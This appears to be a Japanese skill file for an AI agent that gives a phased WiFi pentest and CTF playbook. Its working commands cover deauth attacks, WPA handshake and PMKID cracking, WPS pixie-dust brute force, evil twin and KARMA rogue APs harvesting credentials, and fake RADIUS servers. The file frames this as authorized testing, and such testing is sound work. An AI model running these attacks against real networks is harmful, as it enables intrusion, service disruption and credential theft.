---
name: wifi-security
description: 認可済 WiFi (802.11) の評価。handshake capture / WPA / WPA2 / WPA3 attack / rogue AP / evil twin / pixie dust / KARMA を体系的に試験する。CTF wireless / pentest で発火。
category: hardware
tags:
  - wifi
  - 802.11
  - wpa
  - handshake
  - evil-twin
  - rogue-ap
---

# WiFi Security Testing

## When to Use

- 認可済 WiFi network の audit
- evil-twin / rogue AP / pixie dust の評価
- enterprise WPA-EAP の MitM 試験
- CTF wireless 系問題

**使わない場面**: 一般周波数の sub-GHz (→ `subghz-sdr`)、近距離 BLE / Zigbee。

## Approach / Workflow

### Phase 1 — hardware と環境

```
adapter:
  Alfa AWUS036ACH / NHA / NHB           2.4 / 5 GHz、monitor + injection
  Panda PAU09                            2.4 GHz、monitor
  WiFi pineapple                         pre-built rogue AP

OS: Kali Linux / Parrot / 自前 Linux + iwconfig + airmon-ng
```

```bash
sudo airmon-ng start wlan0       # monitor mode 化 → wlan0mon
iwconfig                          # 確認
```

### Phase 2 — discovery

```bash
sudo airodump-ng wlan0mon
# BSSID / SSID / channel / encryption / clients
sudo airodump-ng -c <ch> --bssid <BSSID> -w capture wlan0mon
```

### Phase 3 — WPA2 PSK handshake capture

```bash
# deauth で 既存 client を切り再接続させる
sudo aireplay-ng --deauth 5 -a <BSSID> -c <client_mac> wlan0mon

# capture file の handshake 確認
aircrack-ng capture-01.cap
hcxpcapngtool -o handshake.hc22000 capture-01.cap

# crack
hashcat -m 22000 handshake.hc22000 wordlist.txt
john --format=wpapsk-opencl handshake.hc22000 --wordlist=wordlist.txt
```

PSK を crack するか / dictionary attack / GPU で速度。

### Phase 4 — PMKID attack (deauth 不要)

```bash
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng
hashcat -m 22000 pmkid.hc22000 wordlist.txt
```

PMKID は AP の RSN IE の一部に含まれ、deauth せずに取得できることがある (古い / 誤設定 AP)。

### Phase 5 — WPS (pixie dust / brute)

```bash
wash -i wlan0mon                   # WPS-enabled AP
reaver -i wlan0mon -b <BSSID> -K 1  # pixie dust (Realtek / Broadcom 弱乱数)
reaver -i wlan0mon -b <BSSID>       # PIN brute
```

成功率は AP version / chipset 依存。pixie dust は秒〜分で完了することも。

### Phase 6 — Evil Twin / Rogue AP

```
hostapd で 同 SSID + 同 channel の AP を立てる
dnsmasq で DHCP / DNS
captive portal 経由で credential 収集 (engagement 内のみ)
phishing site 経由 OS / browser exploit
```

### Phase 7 — KARMA (probe response)

client が常時 broadcast する probe request に対して 全 SSID で応答する rogue AP:

```
hostapd-mana / hostapd-karma
```

過去接続した network 経由で client を引きずり込む。

### Phase 8 — Enterprise WPA-EAP (PEAP / EAP-TTLS)

```
- 偽 RADIUS server (hostapd-wpe / EapHammer / berate_ap)
- client が cert validate しないと credential leak
- 取得 challenge-response から MS-CHAPv2 → asleap / hashcat
```

### Phase 9 — WPA3

```
- SAE (Simultaneous Authentication of Equals) は offline brute 不可
- ただし downgrade attack: WPA3 + WPA2 transition mode を WPA2 に下げて attack
- Dragonblood (CVE-2019-9494/5) による side-channel
- KRACK (WPA2 4-way handshake replay)
```

### Phase 10 — レポート

```
- 環境 (location / SSID / encryption)
- 試験種別 + 成功 / 失敗
- 取得 credential / hash (redact)
- 推奨 (WPA3 / 強 PSK / WPA-EAP の cert pinning / WPS off)
```

## Tools

```
aircrack-ng / airodump-ng / aireplay-ng
hcxdumptool / hcxpcapngtool
hashcat / john
hostapd / hostapd-wpe / hostapd-mana
wash / reaver / bully
EapHammer / berate_ap
WebFetch
Bash (sandbox)
```

## Related Skills

- `subghz-sdr`, `firmware-iot-security`
- `replay-attack`, `network-analyzer`
- `red-teamer`, `infrastructure`, `social-engineering`
- `bug-bounter`, `essential-tools`

## Rules

1. **電波法** — 802.11 帯は public、しかし monitor / injection は許認可確認
2. **scope 厳守** — 自分の network / engagement 認可済 のみ
3. **隣接 network への影響回避** — deauth は target client のみ、broad attack 禁止
4. **取得 credential** — sealed area
